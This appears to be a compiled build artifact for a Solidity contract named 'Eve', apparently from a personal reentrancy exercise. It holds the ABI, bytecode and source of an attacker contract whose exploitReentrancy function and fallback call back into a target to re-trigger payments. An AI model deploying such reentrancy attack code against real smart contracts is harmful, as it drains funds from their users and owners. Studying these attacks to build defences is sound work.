{
  "contractName": "Eve",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "a",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "exploitReentrancy",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548160ff0219169083151502179055506000600155341561002e57600080fd5b61015b8061003d6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806339560df4146100b1575b600115156000809054906101000a900460ff1615151415610061576100af565b3373ffffffffffffffffffffffffffffffffffffffff1660015460405160006040518083038185876187965a03f1925050505060016000806101000a81548160ff0219169083151502179055505b005b34156100bc57600080fd5b6100f1600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919080359060200190919050506100f3565b005b806001819055508173ffffffffffffffffffffffffffffffffffffffff168160405160006040518083038185876187965a03f1925050505050505600a165627a7a7230582089d32062497d1ce302929ccc61042a9cfbb0fff01b8c9f5fada47641c529953d0029",
  "source": "pragma solidity ^0.4.19;\n\ncontract Eve {\n\n  \n       bool alreadyCalled = false;\n       uint tokenAmount = 0;\n   \n    \n    \n    \n    function exploitReentrancy(address a, uint amount) public {\n        //a.call(bytes4(sha3(\"buyTokens(address _beneficiary)\")), this.owner);\n        tokenAmount = amount;\n        a.call.value(amount)();\n        \n    }\n\n   /* function() withdraw public onlyOwner () {\n        token.transfer(msg.sender, token.balances[this.address]);\n    }*/\n\n\n    \n    function() payable public {\n        if(alreadyCalled == true) {\n            return;\n       }\n       // msg.sender.call(bytes4(sha3(\"buyTokens(address _beneficiary)\")), this.owner);\n        msg.sender.call.value(tokenAmount)();\n        alreadyCalled = true;\n        \n        \n    }\n}\n",
  "sourcePath": "/Users/leovonkleist/Desktop/SmartContracts/reentrancy/contracts/Eve.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.19+commit.c4cbbb05.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-04-16T09:15:50.318Z"
}